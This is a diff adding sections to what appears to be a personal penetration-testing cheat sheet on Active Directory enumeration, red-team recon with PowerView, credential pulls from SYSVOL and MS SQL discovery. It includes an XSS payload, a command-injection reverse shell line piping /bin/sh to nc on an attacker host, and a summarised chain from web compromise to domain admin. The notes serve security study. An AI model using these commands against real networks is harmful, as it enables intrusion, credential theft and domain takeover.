@@ -801,6 +801,12 @@ or
 " onload="alert(String.fromCharCode(88,83,83))
 
 ```
+# Web Applications: Authentication and Authorization
+
+Authenticaiton - the process of determiningg wheteher someone is really who they claim to be. This protection mechanism ensures that contents are accessed only if the user or the application has rights to do so.
+
+Focus for this program is on single factor
+
 # Active Directory Enumeration and Information Gathering
 
 ## Windows domain enumeration & recon
@@ -901,6 +907,12 @@ Enumeratinng shares is critical as they often can contain critical information
 
 > nslookup -querytype=SRV _LDAP._TCP.DC._MSDCS.<domain name>
 
+## Bypassing the restrictanonymous bypass technique
+
+https://vidstromlabs.com/freetools/dumpusers/
+
+Automated SID walking through the "dumpusers" tool. 
+
 ## Powershell recon and enumeration
 
 DC discovery
@@ -910,4 +922,222 @@ DC discovery
 DC Discovery
 
 > nltest /server:<ip of any member> /dclist:<domain name>
+
+Confirming domain information 
+
+> net view /domain
+
+### More Net commands
+
+This command will output a list of domains and workgroups.
+
+> net view /domain:<domain-name>
+
+Identifying hostnames via DNS. 
+
+> nslookup <IP address>
+
+See dns enumeration shell script in github.
+ 
+ Get a remote machines MAC address
+
+ > nbtstat -A <remote ip address>
+
+## Automated tools
+
+1. Dumpsec - http://www.systemtools.com/somarsoft/?somarsoft.com
+
+2. shareenum (sysinternals tool)
+
+3. enum.exe - https://dl.packetstormsecurity.net/advisories/bindview/enum.tar.gz
+
+## Shares with insecure permissions
+
+> net use e: \\ip\ipc$ <password> /user:<domain>\<username>
+
+> net view \\ip
+
+# Red Team Oreinted recon and enumeration for "stealth"
+
+```
+The majority of these commands are going to be from a "unprivileged" user account.
+```
+
+This section covers:
+
+1. Hunting for users
+
+2. Local admin enumeration
+
+3. GPO enumeration and abuse
+
+4. AD ACLs
+
+5. Domain Trusts
+
+## Tools
+
+The two main tools used are going to be:
+
+1. Powerview - https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+
+2. AD Powershell module - https://technet.microsoft.com/en-us/library/ee617195.aspx
+
+TO get started.. inside an elevate powershell run:
+
+> Import-Module ServerManager
+
+> Add-WindowsFeature RSAT-AD-Powershell
+
+### AD Powershell enumeration
+
+Will return a list of machines and hostnames associated to all machines inside the domain or forest.
+
+> get-adcomputer -filter * -properties ipv4address | where {$_.IPV4address} | select name,ipv4address
+
+This version of the command will return other usefull information, basically filtering down the results of the "Get-ADComputer" commands.
+
+> get-adcomputer -filter {ipv4address -eq 'IP'} -Properties Lastlogondate,passwordlastset,ipv4address
+
+SPN Scanning
+
+> Find-PSServiceAccounts - https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts
+
+> Get-ADComputer -filter {ServicePrincipalName -Like "*SPN" } -Properties OperatingSystem,operatingSystemversion,operatingsystemservicepack,passwordlastset,Lastlogondate,serviceprincipalname,Trustedfordelegation,trustedauthfordelegation
+
+### Information on SPN scanning https://adsecurity.org/?p=230
+
+## Group Policies
+
+Discover all group policies inside a domain
+
+> Get-NetGPO | select displayname,name,whenchanged
+
+### User Hunting
+
+This command searches for domain administrators
+
+> Get-NetGroupMember 'Domain Admins' -Recurse
+
+Same command but find users that match the pattern as well, this will allow us to find admins who have an elevated and unelevated account in terms of privilege.
+
+> Get-NetGroupMember -Groupname 'Domain Admins' -Fulldata | $a=$ .displayname.split(')[0..1] -join ' '; Get-NetUser -Filter "(displayname=*$a*)" | Select-Object -Property displayname,samaccountname
+
+### Powerview's "Invoke-UserHunter"
+
+This command will show users that are on high traffic machines which is where the stealth feature comes in. Then it can perform a "Net-GetSession" against those systems. These can provide a almost complete path of the network.
+
+> Invoke-UserHunter -stealth -showall
+
+The stealth tag will get information based off machines that the majority of other machines talk to. Running with out the stealth tag is noisy and actively searches for the information instead of waiting for it from high traffic devices.
+
+## Local Admin enumeration
+
+Two main tools:
+
+1. WinNT service provider.
+
+2. NetLocalGroupGetMembers win32 api call. Faster but doesnt get the same amount of information but it is much faster since it is a native windows function.
+
+> ([ADSI])'WinNT://<computername>/Administrators').psbase.Invoke('Members') | %($_.GetType().InvokeMember('Name', 'getProperty', $null, $_, $null) } 
+
+Another way and easier on your fingers...
+
+> Get-NetLocalGroup -ComputerName <computer name>
+
+> Get-NetLocalGroup -ComputerName <computer name> -API
+
+> Get-NetLocalGroup -ComputerName <computer name> -Recurse
+
+```
+Identify admin accounts without any group
+```
+
+Get-NetUser -AdminCount | select name,whencreated,pwdlastset,lastlogon
+
+## Powersploit Creds pull
+
+Identify admin creds in "SYSVOL". 
+
+> get-GPPPassword on a compromised host.
+
+## AD Forest Enumeration
+
+> get-ADForest
+
+## AD Domain Informaion
+
+> Get-NetDomain
+
+# Summary of "Moving from Linux to domain admin through unprivileged users and an ACL path
+
+1. Launch metasploit
+
+2. HTTP version scan on web app server
+
+3. Perform directory busting with dirb.
+
+4. Found admin directory that allowed for command injection and piping command.
+
+5. Established a reverse shell, made a mknod in /tmp/bagpipe,
+
+> ?path=/etc/ | /bin/sh 0</tmp/backpipe | nc <ip address> <port> then had a nc listner on the atacker machine.
+
+6. performed uname -a to get kernel version. Found a kernel race condition privilege escaltion.
+
+7. Downloaded exploit to victim machines /tmp dir. 
+
+8. Compiled it with gcc and chmod +x to make it executable.
+
+9. Dumped secrets.tdb contents with
+
+> tdbdump /var/lib/samba/private/secrets.tdb
+
+10. kinit ubuntu@els.local to get kerberos ticket.
+
+11. smbclient -k -L //user8.els.local - uses the ticket that was acquired to login.
+
+12. Acquired a client certs share.
+
+13. Lateral movement with password spraying. They created a user list and did a bash script with rpcclient to get into a machine and check if credentials worked.
+
+14. used impacket wimexec.py to gain access.
+
+15. Used Powershell empire to create a batch file for c2 work.
+
+16. Downloaded to a machine via a malicious outlook email rule.
+
+17. Enumerated device with powershell empire.
+
+18. Loaded malicious meterpreter payload via powershell empire.
+
+19. Changed domain admin password with powershell in meterpreter
+
+20. used wmiexec to traverse the network.
+
+# Penetration Testing Critical Domain Infrastructure
+
+# Red Teaming MS SQL
+
+1. To find MS SQL server instances in a domain run.
+
+> sqlcmd -L
+
+It will list out sql servers..
+
+The same thing can be done with metasploits mssql_ping module.
+
+> use auxiliary/scanner/mssql/mssql_ping
+
+## Powersploit modules
+
+> import-module .\PowerUpSQL.psd1
+
+> Get-SQLInstanceScanUDP
+
+
+
+
+
+
 
